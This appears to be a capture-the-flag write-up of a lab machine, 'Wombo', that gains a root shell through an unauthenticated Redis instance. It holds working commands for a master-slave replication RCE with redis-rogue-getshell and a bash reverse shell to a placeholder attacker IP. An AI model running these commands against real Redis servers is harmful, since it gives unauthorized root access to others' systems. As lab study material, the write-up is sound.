# Wombo — Proving Grounds

> [!abstract] Summary
> Wombo is a straightforward machine where the only real attack surface is an **unauthenticated Redis 5.0.9** instance running as **root**. Although the box also exposes nginx (80), NodeBB (8080), and MongoDB (27017), those services are either default pages or require authentication. Redis accepts connections without a password, making it vulnerable to the **master-slave replication RCE** attack. Using `redis-rogue-getshell`, a rogue Redis master pushes a malicious shared object (`.so`) module to the target, which then executes arbitrary commands — directly as **root**. No privilege escalation is needed.

**Target:** `192.168.143.69`

## Methodology

1. Full TCP port scan reveals SSH (22), nginx (80), Redis (6379), NodeBB (8080), and MongoDB (27017).
2. nginx serves a default page; NodeBB requires registration; MongoDB requires authentication — all dead ends.
3. Redis 5.0.9 accepts unauthenticated connections and runs as root.
4. Exploit Redis via master-slave replication RCE using `redis-rogue-getshell` to load a malicious module.
5. Execute a reverse shell command through the loaded module → root shell.

Five services are exposed. The key observations:
- **Port 80 (nginx 1.10.3):** Default "Welcome to nginx!" page — no application content.
- **Port 6379 (Redis 5.0.9):** Unauthenticated access — this is the attack vector.
- **Port 8080 (NodeBB):** A NodeBB forum. Requires registration/login. The `robots.txt` disallows `/admin/`, `/reset/`, `/compose`.
- **Port 27017 (MongoDB 4.0.18):** Requires authentication — `listDatabases` returns `Unauthorized`.

> [!tip] Learning Note
> NodeBB uses Redis or MongoDB as its backend database. In this case, the unauthenticated Redis instance is likely the backend for NodeBB. While NodeBB itself is not the attack vector here, understanding the relationship helps explain why Redis is exposed.

### Redis enumeration

Connect to Redis without credentials to confirm unauthenticated access:
```
redis-cli -h 192.168.143.69
```

Gather server information:
```
192.168.143.69:6379> info server
```

Key findings from `info server`:
- `redis_version:5.0.9`
- `os:Linux 4.9.0-12-amd64 x86_64`
- `config_file:/etc/redis/redis.conf`

Check the current working directory:
```
192.168.143.69:6379> config get dir
1) "dir"
2) "/"
```

The Redis instance runs as **root** (confirmed later) and has no password set. This makes it vulnerable to the Redis master-slave replication RCE.

> [!warning] Dead end — writing a webshell
> A common Redis exploitation technique is writing a webshell to the web root using `config set dir /var/www/html/` + `config set dbfilename shell.php` + `save`. This **does not work** here because nginx does not interpret PHP — it serves static files only. The NodeBB application on port 8080 is Node.js-based, not PHP, so there is no PHP handler to execute a webshell.

## Initial Foothold — Redis Master-Slave Replication RCE

### Searchsploit lookup

```

```

The relevant entry:
```
Redis 4.x / 5.x - Unauthenticated Code Execution    | linux/remote/47195.rb
```

### Method 1: redis-rogue-getshell (non-Metasploit)

This is the preferred OSCP-friendly method since it does not use Metasploit.

The attack works by exploiting Redis master-slave replication: the attacker runs a rogue Redis master that forces the target to replicate a malicious `.so` module. Once loaded, this module provides a `system.exec` command for arbitrary code execution.

Clone the tool:
```
git clone https://github.com/vulhub/redis-rogue-getshell.git
cd redis-rogue-getshell
```

First, verify command execution:
```
python3 redis-master.py -r 192.168.143.69 -p 6379 -L YOUR_KALI_IP -P 27017 -f RedisModulesSDK/exp.so -c "id"
```

Expected output:
```
uid=0(root) gid=0(root) groups=0(root)
```

> [!note] Learning Note — redis-master.py arguments
> - `-r` = target (remote) Redis IP
> - `-p` = target Redis port (6379)
> - `-L` = attacker (local) IP — your Kali VPN IP
> - `-P` = port the rogue master listens on (can be anything; 27017 is used to avoid conflicts)
> - `-f` = path to the malicious shared object module (`exp.so`)
> - `-c` = command to execute

Redis is running as **root** — no privilege escalation needed.

Now get a reverse shell. Start a listener:
```
nc -lvnp 6379
```

Fire the exploit with a bash reverse shell:
```
python3 redis-master.py -r 192.168.143.69 -p 6379 -L YOUR_KALI_IP -P 27017 -f RedisModulesSDK/exp.so -c "bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/6379 0>&1'"
```

The shell connects back as root.

> [!tip] Learning Note — How the replication RCE works
> 1. The script tells the target Redis to `SLAVEOF` the attacker's rogue master.
> 2. The rogue master sends a `PSYNC` containing the malicious `exp.so` module.
> 3. The target writes the module to disk via `CONFIG SET dbfilename exp.so`.
> 4. The script loads the module with `MODULE LOAD ./exp.so`.
> 5. The module registers a `system.exec` command that executes OS commands.
> 6. After execution, the script cleans up: `MODULE UNLOAD system`, `SLAVEOF NO ONE`, `CONFIG SET dbfilename dump.rdb`.

### Method 2: Metasploit

If Metasploit is allowed in your exam/practice:
```
msfconsole
```

This also returns a root shell directly.

> [!warning] Cleanup
> The Metasploit module may leave a `.so` file on the target. The console warns: "may require manual cleanup of './<random>.so' on the target."

## Lessons Learned

| Stage | Technique | Takeaway |
|---|---|---|
| Enumeration | Nmap full port scan | Multiple services (nginx, NodeBB, MongoDB) are distractions — Redis is the only unauthenticated one |
| Enumeration | `redis-cli info server` | Always check Redis version and whether authentication is required |
| Dead end | Webshell via Redis write | Writing a PHP webshell fails when the web server doesn't interpret PHP (nginx serving static files) |
| Exploitation | Redis master-slave replication RCE | Redis 4.x/5.x without authentication allows loading malicious modules for arbitrary code execution |
| Privilege escalation | Not needed | Redis running as root gives immediate root access — always check what user a service runs as |

> [!important] Key OSCP Takeaways
> 1. **Check unauthenticated services first.** Redis without a password is a critical finding.
> 2. **Understand the web stack** before trying webshell writes — nginx without PHP modules cannot execute `.php` files.
> 3. **redis-rogue-getshell** is the go-to non-Metasploit tool for Redis 4.x/5.x replication RCE.
> 4. Services running as root mean no privilege escalation is needed — always check with `id` after getting a shell.
